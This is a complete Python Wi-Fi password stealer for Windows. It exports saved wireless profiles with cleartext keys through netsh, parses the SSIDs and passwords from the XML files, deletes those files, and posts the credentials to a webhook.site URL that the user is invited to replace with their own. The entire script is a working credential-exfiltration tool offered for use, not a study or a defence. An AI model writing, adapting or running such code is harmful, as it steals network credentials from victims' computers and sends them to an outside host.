import subprocess, os, sys, requests
import xml.etree.ElementTree as ET

#stealer URL - place yours here
url = 'https://webhook.site/df2d35f2-acdf-47c9-8739-383b7d97e740'

#Lists & Dicts
wifi_files = []
payload = {"SSID":[], "Password":[]}

#Use Python to execute Windows command
command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

#Grab current directory
path = os.getcwd()

#Append Wi-Fi XML files to wifi_files list
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

#Parse Wi-Fi XML files
if len(wifi_files) >= 1:
    for file in wifi_files:
        tree = ET.parse(file)
        root = tree.getroot()
        SSID = root[0].text
        password = root[4][0][1][2].text
        payload["SSID"].append(SSID)
        payload["Password"].append(password)
        os.remove(file)
    print("Wi-Fi profiles found.  Check your webhook")
else:
        print("No Wi-Fi profiles found.  Exiting application")
        sys.exit()

#Send the hackies
payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
r = requests.post(url, params='format=json', data=payload_str)
